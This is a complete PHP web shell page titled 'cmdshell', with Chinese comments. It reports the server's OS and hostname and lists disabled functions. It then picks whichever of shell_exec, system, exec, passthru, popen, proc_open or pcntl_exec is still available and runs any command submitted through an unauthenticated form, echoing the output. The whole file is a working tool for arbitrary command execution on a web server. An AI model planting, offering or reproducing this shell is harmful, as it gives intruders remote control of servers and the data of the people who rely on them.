<?php
    define('LINE','<br>');

    if (isset($_POST['encoding'])) {
        header('Content-Type: text/html; charset=' . $_POST['encoding']);
    }


    /**
     * 获取环境的基本信息
     */
    function show_basic() {
        $os = php_uname('s');
        $hostname = php_uname('n');
        $release = php_uname('r');
        $version = php_uname('v');

        echo '<pre>';
        echo 'OS: ' . $os . LINE;
        echo 'Hostname: ' . $hostname . LINE;
        echo 'Release: ' . $release . LINE;
        echo 'Version: ' . $version . LINE;
        echo '</pre>';
        echo '<hr>';
    }


    /**
     * 获取php.ini中被禁用的函数名
     * @param bool $display 是否显示disable_functions
     * @return array disable_functions
     */
    function get_disable($display=false) {
        $func = ini_get('disable_functions');
        echo (function_exists('pcntl_exec') ? 'pcntl_exec is available' : 'pcntl_exec is unavailable') . LINE;

        if (!$func && $display) {
            echo 'No disabled function found ! ' . LINE . LINE;
            return array();
        }

        $func = explode(',',$func);
        if ($display) {
            echo 'disable_functions: ';
            foreach ($func as $fun) {
                echo $fun . " ";
            }
            echo LINE . LINE;
        }
        return $func;
    }


    /**
     * 生成select下拉菜单
     */
    function generate_select() {
        echo '<select name="func">';
        $available = array('shell_exec','system','exec','passthru','popen','proc_open','pcntl_exec');
        $disable = get_disable(false);

        foreach ($available as $fun) {
            if (!in_array($fun, $disable) && function_exists($fun)) {
                // 参数记忆
                if ($_POST['func'] == $fun) {
                    echo '<option selected>' . $fun . '</option>';
                    continue;
                }
                echo '<option>' . $fun . '</option>';
            }
        }
        echo '</select>';
    }


    /**
     * 执行命令并显示执行结果
     * @param $cmd 要执行的命令
     */
    function exec_and_display($func,$cmd) {
        echo '<pre>';
        switch ($func) {
            case 'shell_exec':
                echo shell_exec($cmd);
                break;
            case 'exec':
                exec($cmd,$res);
                foreach ($res as $line) {
                    echo $line . LINE;
                }
                break;
            case 'system':
                system($cmd);
                break;
            case 'passthru':
                passthru($cmd);
                break;
            case 'popen':
                $handle = popen($cmd, "r");
                echo stream_get_contents($handle);
                pclose($handle);
                break;
            case 'proc_open':
                $arr = array(
                    0 => array('pipe','r'),
                    1 => array('pipe','w'),
                );
                $process = proc_open($cmd,$arr,$pipes); // pipes 文件指针
                echo stream_get_contents($pipes[1]);
                fclose($pipes[0]);
                fclose($pipes[1]);
                proc_close($process);
                break;
            case 'pcntl_exec':
                // 此函数较特殊，CLI下可以使用，Web下需要判断
                if (function_exists('pcntl_exec')) {
                    $args = explode(' ',$cmd);
                    array_unshift($args,'-c');
                    $shell = '/bin/sh';
                    pcntl_exec($shell,$args);
                }
                break;
        }
        echo '</pre>';
    }
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>cmdshell</title>
</head>
<body>
<div>
    <!-- Show the required information -->
    <?php
        show_basic();
        get_disable(true);
    ?>
    <form method="post">
        <!-- Generate the available functions list -->
        <?php generate_select(); ?>
        <input type="text" name="cmd" placeholder="command" style="width: 200px">
        <select name="encoding">
            <option>utf-8</option>
            <option>gbk</option>
            <option>gb2312</option>
        </select>
        <input type="submit" value="exec">
    </form>
</div>
    <!-- Exec output -->
    <?php
        if ($_POST) {
            exec_and_display($_POST['func'],$_POST['cmd']);
        }
    ?>
</body>
</html>
